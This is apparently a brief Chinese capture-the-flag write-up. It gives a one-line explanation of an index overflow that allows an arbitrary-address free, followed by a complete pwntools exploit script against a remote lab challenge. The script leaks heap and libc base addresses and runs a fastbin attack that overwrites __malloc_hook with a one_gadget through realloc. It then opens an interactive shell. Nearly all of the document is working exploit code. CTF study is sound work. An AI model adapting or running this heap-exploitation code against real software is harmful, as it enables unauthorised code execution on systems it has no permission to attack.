下标溢出，直接任意地址free，之后直接fastbin attack就行

payload如下
```
from pwn import *

debug = 0
if debug:
    p = process('./pwn2')
    gdb.attach(p)
else:
    p = remote('85c3e0fcae5e972af313488de60e8a5a.kr-lab.com', 58512)

context.log_level='debug'

e = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')


def add(len, context):
	p.recvuntil('choice:')
	p.sendline('2')
	p.recvuntil(':')
	p.sendline(str(len))
	p.recvuntil('\n')
	p.send(context)

def show():
	p.recvuntil('choice:')
	p.sendline('1')

def edit(index, context):
	p.recvuntil('choice:')
	p.sendline('3')
	p.recvuntil(':')
	p.sendline(str(index))
	p.recvuntil('\n')
	p.send(context)

def delete(index):
	p.recvuntil('choice:')
	p.sendline('4')
	p.recvuntil(':')
	p.sendline(str(index))



#gdb.attach(p, 'b* 0x400CFD')
add(0x80, 'a'*8) #0
add(0x80, 'a'*8) #1
add(0x80, 'a'*8) #2
add(0x80, 'a'*8) #3
add(0x80, 'a'*8) #4
delete(3)
delete(1)
add(0x80, 'a'*8) #1
show()
p.recvuntil('1 : aaaaaaaa')
heap_base = u64(p.recvuntil('2', drop=True).ljust(8, '\x00')) - 0x90

for i in range(5):
	delete(i)

add(0x200,'a'*8)
add(0x200,'a'*8)
delete(0)
add(0x200,'a'*8)
show()
p.recvuntil('0 : aaaaaaaa')
libc_base = u64(p.recvuntil('1', drop=True).ljust(8, '\x00')) - 0x3C4B20 - 88
delete(0)
delete(1)

#fastbin attack
add(0x68,'a')
add(0x68,p64(heap_base+0x10)*2)
add(0x68,'c')

fake_addr = heap_base+0x80
delete((fake_addr-0x602068+0x10)/0x10)

malloc_hook = libc_base + e.symbols['__malloc_hook']
realloc = libc_base + 0x846C0 

edit(0,p64(malloc_hook-0x23))
add(0x68,'a')
add(0x68,'a'*11+p64(libc_base+0x4526a)+p64(realloc))

p.recvuntil('Your choice:')
p.sendline('2')
p.recvuntil('Please enter the length of daily:')
p.sendline('1')

print hex(libc_base)
print hex(heap_base)


p.interactive()

```